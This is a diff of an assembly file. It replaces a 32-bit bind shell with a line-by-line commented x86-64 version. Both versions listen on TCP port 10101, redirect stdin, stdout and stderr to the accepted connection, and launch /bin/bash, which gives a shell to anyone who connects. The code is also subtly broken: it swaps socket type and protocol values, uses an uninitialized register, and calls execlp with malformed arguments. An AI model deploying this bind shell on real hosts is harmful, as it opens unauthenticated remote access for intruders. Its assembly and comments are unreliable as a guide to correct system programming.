@@ -1,88 +1,98 @@
-.section .bss
-    sin:
-        .long 0
-        .long 0
-        .long 0
-    sock:
-        .long 0
-    fd:
-        .long 0
+sin:
+    .zero 16  ; Allocate 16 bytes of memory for the `sin` structure
+sock:
+    .zero 4   ; Allocate 4 bytes of memory for the `sock` variable (socket file descriptor)
+fd:
+    .zero 4   ; Allocate 4 bytes of memory for the `fd` variable (file descriptor)
 
-.section .data
-    bash:
-        .string "/bin/bash"
+.LC0:
+    .string "/bin/bash"  ; Define a string literal containing the path to the `/bin/bash` shell
 
-.section .text
-.global _start
-_start:
-    /* Create socket */
-    mov $1, %eax             /* sys_socketcall */
-    mov $1, %ebx             /* socket */
-    mov $2, %ecx             /* AF_INET */
-    mov $1, %edx             /* SOCK_STREAM */
-    int $0x80                /* syscall */
+bash:
+    .quad   .LC0  ; Define a quadword (64-bit integer) variable `bash` pointing to the `.LC0` string (path to `/bin/bash`)
 
-    /* Store socket descriptor */
-    mov %eax, sock
+main:
+    push    rbp  ; Push the base pointer (RBP) of the current stack frame onto the stack
 
-    /* Prepare sockaddr_in structure */
-    mov $0x2, %ax            /* AF_INET */
-    mov %ax, (%esi)          /* sin_family */
-    mov $0x7527, %ax         /* port 10101 */
-    push %ax
-    mov %sp, %ebx
-    mov %ebx, 2(%esi)        /* sin_port */
+    mov     rbp, rsp  ; Set the base pointer (RBP) to the stack pointer (RSP)
 
-    /* Bind */
-    mov $2, %eax             /* sys_socketcall */
-    mov $2, %ebx             /* bind */
-    lea sin, %ecx            /* pointer to sockaddr_in */
-    mov $16, %edx            /* sizeof(struct sockaddr_in) */
-    int $0x80                /* syscall */
+    ; Initialize the `sin` structure for the server address
 
-    /* Listen */
-    mov $2, %eax             /* sys_socketcall */
-    mov $4, %ebx             /* listen */
-    mov sock, %ecx           /* sockfd */
-    mov $1, %edx             /* backlog */
-    int $0x80                /* syscall */
+    mov     eax, AF_INET  ; Set `eax` to the value of `AF_INET` (IPv4 address family)
+    mov     WORD PTR sin[rip], ax  ; Store `eax` (AF_INET) in the `sin_family` field of the `sin` structure
+    mov     edi, 10101  ; Set `edi` to the port number (10101)
+    call    htons  ; Convert the port number from host byte order to network byte order
+    mov     WORD PTR sin[rip+2], ax  ; Store the converted port number in the `sin_port` field of the `sin` structure
 
-    /* Accept */
-    mov $2, %eax             /* sys_socketcall */
-    mov $5, %ebx             /* accept */
-    mov sock, %ecx           /* sockfd */
-    push $0                  /* addr */
-    push $0
-    push $0
-    lea (%esp), %ecx         /* struct sockaddr_in *addr */
-    push $16                 /* addrlen */
-    push %ecx
-    mov %esp, %ecx
-    int $0x80                /* syscall */
+    ; Create a socket for the server
 
-    /* Store accepted socket descriptor */
-    mov %eax, fd
+    mov     edx, 6       ; Set `edx` to the value of `SOCK_STREAM` (stream socket type)
+    mov     esi, 1       ; Set `esi` to the value of `IPPROTO_TCP` (TCP protocol)
+    mov     edi, 2       ; Set `edi` to the value of `AF_INET` (IPv4 address family)
+    call    socket  ; Create a socket and store its file descriptor in `eax`
+    mov     DWORD PTR sock[rip], eax  ; Store the socket file descriptor in the `sock` variable
 
-    /* Redirect stdin, stdout, stderr to the accepted socket */
-    mov $63, %eax            /* sys_dup2 */
-    mov fd, %ebx             /* oldfd */
-    mov $0, %ecx             /* newfd = stdin */
-    int $0x80                /* syscall */
+    ; Bind the socket to the server address
 
-    mov $63, %eax            /* sys_dup2 */
-    mov fd, %ebx             /* oldfd */
-    mov $1, %ecx             /* newfd = stdout */
-    int $0x80                /* syscall */
+    mov     edx, 16       ; Set `edx` to the size of the `sin` structure (16 bytes)
+    mov     esi, OFFSET FLAT:sin  ; Set `esi` to the offset of the `sin` structure in memory
+    mov     edi, eax     ; Set `edi` to the socket file descriptor
+    call    bind  ; Bind the socket to the specified address and port
 
-    mov $63, %eax            /* sys_dup2 */
-    mov fd, %ebx             /* oldfd */
-    mov $2, %ecx             /* newfd = stderr */
-    int $0x80                /* syscall */
+    ; Listen for incoming connections on the socket
 
-    /* Execute /bin/bash */
-    mov $11, %eax            /* sys_execve */
-    lea bash, %ebx           /* filename */
-    xor %ecx, %ecx           /* argv = NULL */
-    xor %edx, %edx           /* envp = NULL */
-    int $0x80                /* syscall */
+    mov     eax, DWORD PTR sock[rip]  ; Set `eax` to the socket file descriptor
+    mov     esi, 1       ; Set `esi` to the backlog size (maximum number of pending connections)
+    mov     edi, eax     ; Set `edi` to the socket file descriptor
+    call    listen  ; Listen for incoming connections on the socket
 
+    ; Accept an incoming connection on the socket
+
+    mov     eax, DWORD PTR sock[rip]  ; Set `eax` to the socket file descriptor
+    mov     edx, 0       ; Set `edx` to NULL (unused for client address)
+    mov     esi, 0       ; Set `esi` to 0 (unused for client address length)
+    mov     edi, eax     ; Set `edi` to the socket file descriptor
+    call    accept  ; Accept an incoming connection and store the client socket file descriptor in `eax`
+    mov     DWORD PTR fd[rip], eax  ; Store the client socket file descriptor in the `fd` variable
+
+    ; Duplicate the client socket file descriptor for standard input (stdin)
+
+    mov     eax, DWORD PTR fd[rip]  ; Set `eax` to the client socket file descriptor
+    mov     esi, 0       ; Set `esi` to 0 (standard input descriptor)
+    mov     edi, eax     ; Set `edi` to the client socket file descriptor
+    call    dup2  ; Duplicate the client socket file descriptor and redirect it to standard input
+
+    ; Duplicate the client socket file descriptor for standard output (stdout)
+
+    mov     eax, DWORD PTR fd[rip]  ; Set `eax` to the client socket file descriptor
+    mov     esi, 1       ; Set `esi` to 1 (standard output descriptor)
+    mov edi, eax  ; Set `edi` to the client socket file descriptor
+    call  dup2  ; Duplicate the client socket file descriptor and redirect it to standard output
+
+    ; Duplicate the client socket file descriptor for standard error (stderr)
+    
+
+    mov     eax, DWORD PTR fd[rip]  ; Set `eax` to the client socket file descriptor
+    mov     esi, 2       ; Set `esi` to 2 (standard error descriptor)
+    mov     edi, eax     ; Set `edi` to the client socket file descriptor
+    call    dup2  ; Duplicate the client socket file descriptor and redirect it to standard error
+
+    ; Execute the `/bin/bash` shell
+
+    mov     rcx, QWORD PTR bash[rip]  ; Set `rcx` to the address of the `/bin/bash` path stored in `bash`
+    mov     rax, QWORD PTR bash[rip]  ; Set `rax` to the address of the `/bin/bash` path stored in `bash` (redundant)
+    mov     rdx, NULL                 ; Set `rdx` to NULL for default environment variables
+    mov     rsi, rcx                 ; Set `rsi` to the address of the argument array (currently empty)
+    mov     rdi, rax                 ; Set `rdi` to the address of the `/bin/bash` path
+    mov     eax, 0                   ; Set `eax` to 0 (arguments for `execlp`)
+    call    execlp                   ; Replace current process with `/bin/bash`
+
+    ; If execlp fails, jump to error handling (not implemented here)
+;   cmp     eax, 0
+;   jne    error
+
+    mov     eax, 0                   ; Set `eax` to 0 (exit code)
+
+    pop     rbp                      ; Restore the base pointer (RBP) from the stack
+
+    ret                             ; Return from the `main` function
